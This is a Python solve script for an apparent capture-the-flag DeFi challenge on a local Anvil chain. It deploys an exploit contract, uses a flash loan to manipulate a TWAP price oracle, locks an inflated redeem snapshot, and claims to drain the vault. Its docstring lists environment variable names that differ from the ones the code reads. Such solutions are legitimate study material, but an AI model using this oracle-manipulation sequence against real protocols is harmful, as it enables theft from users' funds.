#!/usr/bin/env python3
"""
    export RPC=...
    export PK=...
    export SETUP=...

    python3 exp.py
"""

import os
import subprocess
import sys
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_DIR = SCRIPT_DIR.parent

def need_env(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        print(f"missing required env: {name}", file=sys.stderr)
        sys.exit(2)
    return value


def run(cmd: list[str], cwd: str | None = None) -> str:
    """Execute a command, return stripped stdout. Exits on failure."""
    env = {
        **os.environ,
        "http_proxy": "",
        "https_proxy": "",
        "HTTP_PROXY": "",
        "HTTPS_PROXY": "",
        "no_proxy": "localhost,127.0.0.1",
        "NO_PROXY": "localhost,127.0.0.1",
    }
    result = subprocess.run(
        cmd,
        cwd=cwd or str(SCRIPT_DIR),
        env=env,
        text=True,
        capture_output=True,
    )
    if result.returncode != 0:
        sys.stderr.write(result.stdout)
        sys.stderr.write(result.stderr)
        sys.exit(result.returncode)
    return result.stdout.strip()


def cast_send(to: str, sig: str, *args: str, private_key: str = "", rpc_url: str = "") -> str:
    """Send a transaction via cast send, return tx hash."""
    cmd = [
        "cast", "send",
        "--rpc-url", rpc_url,
        "--private-key", private_key,
        to, sig,
        *args,
    ]
    return run(cmd)


def cast_call(to: str, sig: str, rpc_url: str, *args: str) -> str:
    """Read-only call via cast. Extra args are passed as function arguments."""
    cmd = ["cast", "call", "--rpc-url", rpc_url, to, sig]
    cmd.extend(args)
    return run(cmd)


def evm_warp(seconds: int, rpc_url: str) -> None:
    """Advance the Anvil chain timestamp by `seconds`."""
    run(["cast", "rpc", "--rpc-url", rpc_url, "evm_increaseTime", hex(seconds)])
    run(["cast", "rpc", "--rpc-url", rpc_url, "evm_mine"])


def parse_deployed(output: str) -> str:
    """Extract 'Deployed to: 0x...' from forge create output."""
    for line in output.splitlines():
        if "Deployed to:" in line:
            return line.split("Deployed to:")[-1].strip()
    print("failed to parse deploy address from forge output:", output, file=sys.stderr)
    sys.exit(1)


def main() -> None:
    rpc_url    = need_env("RPC_URL")
    player_key = need_env("PLAYER_KEY")
    setup      = need_env("SETUP")

    forge = os.environ.get("FORGE", "forge")
    cast  = os.environ.get("CAST", "cast")

    # ── Resolve player address ──────────────────────────────────────────────
    player = os.environ.get("PLAYER")
    if not player:
        player = run([cast, "wallet", "address", "--private-key", player_key])

    print(f"setup  : {setup}")
    print(f"player : {player}")

    # ── Query token / contract addresses from Setup ─────────────────────────
    token_a  = cast_call(setup, "tokenA()(address)", rpc_url)
    token_b  = cast_call(setup, "tokenB()(address)", rpc_url)
    token_c  = cast_call(setup, "tokenC()(address)", rpc_url)
    oracle   = cast_call(setup, "oracle()(address)", rpc_url)
    pair_ab  = cast_call(setup, "pairAB()(address)", rpc_url)
    pair_bc  = cast_call(setup, "pairBC()(address)", rpc_url)

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 0: Deploy Exploit contract
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Deploying Exploit contract...")
    output = run([
        forge, "create",
        "--root", str(PROJECT_DIR),
        "--rpc-url", rpc_url,
        "--private-key", player_key,
        "--broadcast",
        "exp/Exploit.sol:Exploit",
        "--constructor-args", setup,
    ])
    exploit = parse_deployed(output)
    print(f"exploit: {exploit}")

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 1: Transfer player tokens to Exploit contract
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Transferring tokens to Exploit...")

    for token, name in [(token_a, "TKA"), (token_b, "TKB"), (token_c, "TKC")]:
        bal_raw = cast_call(token, "balanceOf(address)(uint256)", rpc_url, player)
        # `cast call` may append human-readable hints like "10000 [1e4]";
        # take only the first whitespace-delimited token (the raw hex or decimal).
        bal = bal_raw.split()[0]
        print(f"  {name} balance: {bal}")
        if bal != "0":
            cast_send(token, "transfer(address,uint256)(bool)", exploit, bal,
                      private_key=player_key, rpc_url=rpc_url)

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 2: Initialize TWAP oracle (fill 2+ observations per pair)
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Initializing TWAP oracle...")

    evm_warp(500, rpc_url)
    cast_send(oracle, "update(address)", pair_ab, private_key=player_key, rpc_url=rpc_url)
    cast_send(oracle, "update(address)", pair_bc, private_key=player_key, rpc_url=rpc_url)
    print("  round 1 done")

    evm_warp(12, rpc_url)
    cast_send(oracle, "update(address)", pair_ab, private_key=player_key, rpc_url=rpc_url)
    cast_send(oracle, "update(address)", pair_bc, private_key=player_key, rpc_url=rpc_url)
    print("  round 2 done")

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 3: Deposit LP + Flash loan manipulate B/C pool
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Step 3: Deposit LP + Flash loan manipulate...")
    cast_send(exploit, "step1_depositAndExploit()",
              private_key=player_key, rpc_url=rpc_url)

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 4: Warp + fill ring buffer with manipulated TWAP
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Step 4: Filling ring buffer with manipulated TWAP...")

    evm_warp(400, rpc_url)
    for i in range(8):
        evm_warp(50, rpc_url)
        cast_send(oracle, "update(address)", pair_bc, private_key=player_key, rpc_url=rpc_url)
        cast_send(oracle, "update(address)", pair_ab, private_key=player_key, rpc_url=rpc_url)
        print(f"  update {i + 1}/8")

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 5: Request redeem — locks inflated snapshot price
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Step 5: Requesting redeem (locking inflated snapshot)...")
    cast_send(exploit, "step2_requestRedeem()",
              private_key=player_key, rpc_url=rpc_url)

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 6: Reverse swap — restore B/C pool ratio
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Step 6: Reversing swap to restore pool ratio...")
    cast_send(exploit, "step3_restorePool()",
              private_key=player_key, rpc_url=rpc_url)

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 7: Warp + fill ring buffer with normal TWAP
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Step 7: Filling ring buffer with normal TWAP...")

    evm_warp(1000, rpc_url)
    for i in range(8):
        evm_warp(50, rpc_url)
        cast_send(oracle, "update(address)", pair_bc, private_key=player_key, rpc_url=rpc_url)
        cast_send(oracle, "update(address)", pair_ab, private_key=player_key, rpc_url=rpc_url)
        print(f"  update {i + 1}/8")

    # ═══════════════════════════════════════════════════════════════════════════
    # Step 8: Wait minimum redeem delay, then claim
    # ═══════════════════════════════════════════════════════════════════════════
    print("\n[*] Step 8: Claiming redeem (draining vault)...")
    evm_warp(2, rpc_url)
    cast_send(exploit, "step4_claim()",
              private_key=player_key, rpc_url=rpc_url)

    # ═══════════════════════════════════════════════════════════════════════════
    # Verify
    # ═══════════════════════════════════════════════════════════════════════════
    solved = cast_call(setup, "isSolved()(bool)", rpc_url)
    print(f"\nisSolved: {solved}")


if __name__ == "__main__":
    main()
